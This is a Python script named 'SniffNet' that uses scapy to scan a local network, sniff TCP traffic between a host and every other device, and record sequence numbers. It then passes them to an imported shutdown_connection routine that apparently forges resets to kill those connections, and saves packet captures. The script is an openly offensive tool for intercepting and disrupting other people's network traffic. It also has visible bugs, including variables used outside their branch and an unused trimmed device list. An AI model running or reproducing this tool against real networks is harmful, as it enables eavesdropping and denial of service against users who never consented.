print("Welcome to SniffNet")
import time
from shutdown import shutdown_connection
from getIPs import scan_network
from scapy.all import sniff, wrpcap, IP, TCP, send
import threading

iface = "eth0"
max_packets = 30
max_time =100

start_time = time.time()
packet_counter = 0
captured_flows = []

# get all the connected ip in the network except the sniffers ip
devices = scan_network()

host = devices[len(devices)-1]["ip"]
print(f"the devices are {devices}")

def should_stop():
    return packet_counter >= max_packets or (time.time() - start_time) >= max_time

def packet_callback(packet):
    global packet_counter
    print(packet.summary())

    if packet.haslayer(IP) and packet.haslayer(TCP):
        ip = packet[IP]
        tcp = packet[TCP]

    print(f"[{packet_counter+1}] {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport}")
    captured_flows.append((ip.src, ip.dst, tcp.sport, tcp.dport, tcp.seq, tcp.ack))
    packet_counter += 1

def sniff_thread(target_ip):
    print(f"[*] Sniffing on {iface} for up to {max_packets} packets or {max_time} seconds...")
    packets = sniff(
        iface = iface, 
        filter = f"tcp and host {host} and host {target_ip}",
        prn=packet_callback, 
        store=True,
        stop_filter=lambda x: should_stop()
    )
    # Shutdown the connection between two devices
    shutdown_connection(host, target_ip, captured_flows)
    wrpcap(f"capture_{target_ip}.pcap", packets)

#start thread
threads = []
devices_trim = devices[:-1]
for device in devices:
    t = threading.Thread(target=sniff_thread, args=(device["ip"],), name=f"sniffer-{device["ip"]}")
    t.start()
    threads.append(t)

#wait for all threads to finish
for t in threads:
    t.join()



print("[✔] Connection reset complete.")
